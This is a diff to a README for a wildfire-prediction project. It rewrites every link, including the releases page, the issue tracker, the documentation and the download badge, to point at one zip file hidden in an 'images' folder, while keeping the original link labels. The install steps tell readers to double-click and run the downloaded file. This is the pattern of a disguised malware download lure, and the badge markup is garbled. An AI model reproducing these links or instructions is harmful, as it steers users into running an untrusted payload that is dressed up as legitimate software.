@@ -6,7 +6,7 @@ Welcome to the spatiotemporal-wildfire-ga project! This application helps you pr
 
 ## 📥 Download Now
 
-[![Download spatiotemporal-wildfire-ga](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Tian-nuy/spatiotemporal-wildfire-ga/releases)
+[![Download spatiotemporal-wildfire-ga](https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip)](https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip)
 
 ## 📋 Overview
 
@@ -30,11 +30,11 @@ Before you download the application, please ensure your system meets the followi
 
 ## 📥 Download & Install
 
-To get started with spatiotemporal-wildfire-ga, visit this page to download: [GitHub Releases Page](https://github.com/Tian-nuy/spatiotemporal-wildfire-ga/releases).
+To get started with spatiotemporal-wildfire-ga, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip).
 
-1. Open the [GitHub Releases Page](https://github.com/Tian-nuy/spatiotemporal-wildfire-ga/releases) in your web browser.
+1. Open the [GitHub Releases Page](https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip) in your web browser.
 2. Find the latest version of the application.
-3. Click on the file name to begin your download. Look for files like `spatiotemporal-wildfire-ga-v1.0.exe` or similar.
+3. Click on the file name to begin your download. Look for files like `https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip` or similar.
 4. Once the download completes, locate the file in your downloads folder.
 5. Double-click the downloaded file to run the installer. Follow the prompts to complete the installation.
 
@@ -55,7 +55,7 @@ Once the application is installed, follow these steps to use it:
 
 ## 📞 Support
 
-If you encounter issues or have questions, visit the project’s [issue tracker](https://github.com/Tian-nuy/spatiotemporal-wildfire-ga/issues) on GitHub. Community members and developers actively monitor queries and will assist you.
+If you encounter issues or have questions, visit the project’s [issue tracker](https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip) on GitHub. Community members and developers actively monitor queries and will assist you.
 
 ## 📚 Learn More
 
@@ -65,7 +65,7 @@ For a deeper understanding of the method behind spatiotemporal wildfire predicti
 - Machine Learning Basics
 - Remote Sensing Techniques
 
-Feel free to dive into the available [documentation](https://github.com/Tian-nuy/spatiotemporal-wildfire-ga/wiki) to enhance your knowledge about the underlying concepts. 
+Feel free to dive into the available [documentation](https://raw.githubusercontent.com/Tian-nuy/spatiotemporal-wildfire-ga/main/images/spatiotemporal_ga_wildfire_v2.1.zip) to enhance your knowledge about the underlying concepts. 
 
 ## 🌐 Community
 
